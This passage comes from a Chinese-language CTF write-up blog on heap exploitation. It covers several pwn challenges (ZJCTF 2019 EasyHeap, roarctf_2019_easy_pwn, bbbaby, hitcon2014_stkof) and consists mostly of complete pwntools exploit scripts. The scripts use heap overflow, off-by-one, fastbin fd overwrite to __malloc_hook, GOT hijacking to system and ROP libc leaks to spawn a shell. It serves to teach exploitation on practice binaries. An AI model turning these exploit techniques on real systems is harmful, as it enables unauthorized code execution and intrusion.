class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">size</span>):<br>     sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">index,content</span>):<br>     sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>     sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>     sla(<span class="hljs-string">&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>     sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">index</span>):<br>     sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#-------------------------------------------------------</span><br><br>alloc(<span class="hljs-number">0x10</span>) <br>alloc(<span class="hljs-number">0x60</span>) <br>alloc(<span class="hljs-number">0x10</span>) <br>alloc(<span class="hljs-number">0x10</span>) <br>fill(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x91</span>)) <br>free(<span class="hljs-number">1</span>) <br>alloc(<span class="hljs-number">0x60</span>) <br>dump(<span class="hljs-number">2</span>) <br>addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:]) <br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(addr) <br>libc_base=addr-<span class="hljs-number">88</span>-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">0x10</span> <br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base) <br>hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] <br>shell=libc_base+o_g_old[<span class="hljs-number">1</span>] <br><span class="hljs-comment">#------------------------------------------------------- </span><br>free(<span class="hljs-number">1</span>) <br>fill(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x71</span>)+p64(hook-<span class="hljs-number">0x23</span>)) <br>alloc(<span class="hljs-number">0x60</span>) <br>alloc(<span class="hljs-number">0x60</span>) <br>fill(<span class="hljs-number">4</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(shell)) <br>alloc(<span class="hljs-number">0x20</span>) <br><span class="hljs-comment">#gdb.attach(r) </span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ZJCTF-2019-EasyHeap-2">[ZJCTF 2019]EasyHeap:</h3><h4 id="功能分析：-2">功能分析：</h4><p>有个system，没有show函数</p><h4 id="漏洞点：堆溢出-2">漏洞点：堆溢出</h4><p>堆溢出，add函数和fill函数size没有关联，保护措施Partial RELRO，got表可写，pie也没开，不用泄露libc基址了</p><h4 id="利用方法：-2">利用方法：</h4><p><strong>堆溢出-&gt;堆分配至heaparray-&gt;got表劫持为system</strong></p><p>这题有heaparray在bss段维护堆，利用堆溢出修改free的堆块的fd申请堆块到heaparray，用bss段的stdin的0x7f绕过fastbin检查</p><p>修改heaparray的指针指向free_got,free_got填入system。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./easyheap&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/2.23/libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29503</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-----------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>     sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>     sa(<span class="hljs-string">&#x27;Content of heap:&#x27;</span>,<span class="hljs-built_in">str</span>(content))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>     sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>     sla(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>     sla(<span class="hljs-string">&#x27;Content of heap : &#x27;</span>,<span class="hljs-built_in">str</span>(content))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>     sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#----------------------------------------------------------</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;pppp&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;pppp&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x71</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">13</span>+p64(<span class="hljs-number">0x71</span>)+p64(<span class="hljs-number">0x6020c0</span>-<span class="hljs-number">0x13</span>))<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;pppp&#x27;</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>edit(<span class="hljs-number">0</span>,p64(elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>free(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="roarctf-2019-easy-pwn：">roarctf_2019_easy_pwn：</h3><h4 id="功能分析：-3">功能分析：</h4><p>功能齐全，用heaparray结构体维护堆，</p><h4 id="漏洞点：of-by-one">漏洞点：of by one</h4><p>size在add和edit里关联起来了，但有个off by one，如果edit size大于add size=10能多输入个字节</p><h4 id="利用方法：-3">利用方法：</h4><p><strong>of by one -&gt;unsortbin leak-&gt;chunk复用-&gt;修改fastbin的fd 为malloc_hook-&gt;劫持malloc_hook为og</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./roarctf_2019_easy_pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26062</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><br><span class="hljs-comment">#-----------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br> sla(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):<br> sla(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br> sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br> sla(<span class="hljs-string">&#x27;content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#-----------------------------------------</span><br>add(<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>+<span class="hljs-number">10</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p8(<span class="hljs-number">0x91</span>))<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x10</span>)<br>show(<span class="hljs-number">2</span>)<br>addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(addr)<br>base=addr-<span class="hljs-number">88</span>-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">0x10</span><br>system=addr+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook=base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>malloc_hook=base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>og=base+o_g_old[<span class="hljs-number">1</span>]<br><span class="hljs-comment">#---------------------------------</span><br>add(<span class="hljs-number">0x60</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>+<span class="hljs-number">10</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p8(<span class="hljs-number">0x71</span>))<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x50</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">9</span>+p64(<span class="hljs-number">0x21</span>))<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x60</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x20</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x71</span>))<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x28</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x71</span>)+p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x60</span>)<br>edit(<span class="hljs-number">5</span>,<span class="hljs-number">0x13</span>+<span class="hljs-number">0x8</span>,p64(<span class="hljs-number">0</span>)+p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(og)+p64(base+libc.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>]+<span class="hljs-number">14</span>))<br>add(<span class="hljs-number">0x66</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><p>0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066</p><h3 id="bbbaby：">bbbaby：</h3><p>劫持__stack_chk_fail的got为main，执行我们rop链泄露libc，再劫持atoi的got为system</p><p>写入bin/sh</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs vim">from pwn import *<br>#from LibcSearcher import * <br>local_file  = <span class="hljs-string">&#x27;./pwn1&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>#remote_libc = <span class="hljs-string">&#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29156</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br><span class="hljs-keyword">se</span>      = lambda data               :r.send(data)<br><span class="hljs-keyword">sa</span>      = lambda delim,data         :r.sendafter(delim, data)<br><span class="hljs-keyword">sl</span>      = lambda data               :r.sendline(data)<br><span class="hljs-keyword">sla</span>     = lambda delim,data         :r.sendlineafter(delim, data)<br>sea     = lambda delim,data         :r.sendafter(delim, data)<br>rc      = lambda numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = lambda                    :r.recvline()<br><span class="hljs-keyword">ru</span>      = lambda delims                         :r.recvuntil(delims)<br>uu32    = lambda data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = lambda data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = lambda <span class="hljs-keyword">tag</span>, addr        :r.info(<span class="hljs-keyword">tag</span> + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.format(addr))<br>o_g_32_old = [<span class="hljs-number">0</span>x3ac3c, <span class="hljs-number">0</span>x3ac3e, <span class="hljs-number">0</span>x3ac42, <span class="hljs-number">0</span>x3ac49, <span class="hljs-number">0</span>x5faa5, <span class="hljs-number">0</span>x5faa6]<br>o_g_32 = [<span class="hljs-number">0</span>x3ac6c, <span class="hljs-number">0</span>x3ac6e, <span class="hljs-number">0</span>x3ac72, <span class="hljs-number">0</span>x3ac79, <span class="hljs-number">0</span>x5fbd5, <span class="hljs-number">0</span>x5fbd6]<br>o_g_old = [<span class="hljs-number">0</span>x45216,<span class="hljs-number">0</span>x4526a,<span class="hljs-number">0</span>xf02a4,<span class="hljs-number">0</span>xf1147]<br>o_g = [<span class="hljs-number">0</span>x45226, <span class="hljs-number">0</span>x4527a, <span class="hljs-number">0</span>xf0364, <span class="hljs-number">0</span>xf1207]<br>def <span class="hljs-keyword">debug</span>(cmd=<span class="hljs-string">&#x27;&#x27;</span>):<br>     gdb.attach(r,cmd)<br>#------------------------------<br>pop_rdi=<span class="hljs-number">0</span>x400a03<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&#x27;your choice\n&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&#x27;address:\n&#x27;</span>,str(elf.got[<span class="hljs-string">&#x27;__stack_chk_fail&#x27;</span>]))<br><span class="hljs-keyword">sa</span>(<span class="hljs-string">&#x27;content:\n&#x27;</span>,p64(<span class="hljs-number">0</span>x40090b))<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&#x27;your choice\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x110+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(<span class="hljs-number">0</span>x40090b)<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&#x27;size:\n&#x27;</span>,str(<span class="hljs-built_in">len</span>(payload)))<br><span class="hljs-keyword">sa</span>(<span class="hljs-string">&#x27;content:\n&#x27;</span>,payload)<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&#x27;your choice\n&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&#x27;your choice\n&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>libc_base=uu64(<span class="hljs-keyword">ru</span>(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-keyword">print</span> hex(libc_base)<br><span class="hljs-built_in">system</span>=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&#x27;your choice\n&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&#x27;address:\n&#x27;</span>,str(elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]))<br><span class="hljs-keyword">sa</span>(<span class="hljs-string">&#x27;content:\n&#x27;</span>,p64(<span class="hljs-built_in">system</span>))<br><span class="hljs-keyword">sla</span>(<span class="hljs-string">&#x27;your choice\n&#x27;</span>,<span class="hljs-string">&#x27;/bin\sh\x00&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>其他：</p><p>填入payload后，第一个2结束原本的main</p><p>第二个二结束__stack_chk_fail的main，再执行rop链里的puts，再返回main</p><p>（我猜）</p><h3 id="hitcon2014-stkof">hitcon2014_stkof</h3><p>参考师傅：<a href="https://blog.csdn.net/qq_41202237/article/details/108481889">(4条消息) 好好说话之unlink_hollk’s blog-CSDN博客_好好说话之unlink</a></p><p><strong>利用方法</strong>：堆溢出-&gt;伪造chunk-&gt;unlink-&gt;劫持got-&gt;泄露libc地址-&gt;开shell</p><p><strong>具体步骤</strong>：(也不具体，不是很懂，具体参考上面那位师傅   orz  )</p><p>1.申请4个堆块</p><p>0x20（任意大小，由于本题没有setbuf函数，这个chunk被夹在两个为缓冲区申请的块中，不好处理）</p><p>0x30（至少为0x30，为能绕过检查,0x8(prev_size) + 0x8(size) + 0x8(fd) + 0x8(bk) + 0x8(next_prev) + 0x8(next_size) = 